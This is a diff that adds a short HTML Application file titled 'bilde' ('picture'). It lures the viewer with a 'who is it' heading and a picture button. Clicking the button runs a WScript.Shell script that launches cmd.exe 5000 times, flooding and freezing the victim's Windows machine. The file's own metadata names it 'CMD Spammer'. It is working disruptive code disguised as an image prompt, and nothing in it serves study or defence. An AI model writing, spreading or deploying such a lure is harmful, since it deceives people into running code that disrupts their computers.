@@ -1,0 +1,30 @@
+<html>
+<head>
+  <title>bilde</title>
+  <HTA:APPLICATION
+    ID="cmdOpener"
+    APPLICATIONNAME="CMD Spammer"
+    BORDER="thin"
+    BORDERSTYLE="normal"
+    CAPTION="yes"
+    MAXIMIZEBUTTON="no"
+    MINIMIZEBUTTON="no"
+    SHOWINTASKBAR="yes"
+    SINGLEINSTANCE="yes"
+    SYSMENU="yes"
+    WINDOWSTATE="normal"
+  >
+  <script type="text/javascript">
+    function spamCMD() {
+      var shell = new ActiveXObject("WScript.Shell");
+      for (var i = 0; i < 5000; i++) {
+        shell.Run("cmd.exe");
+      }
+    }
+  </script>
+</head>
+<body>
+  <h2>hvem er det</h2>
+  <button onclick="spamCMD()">bilde</button>
+</body>
+</html>
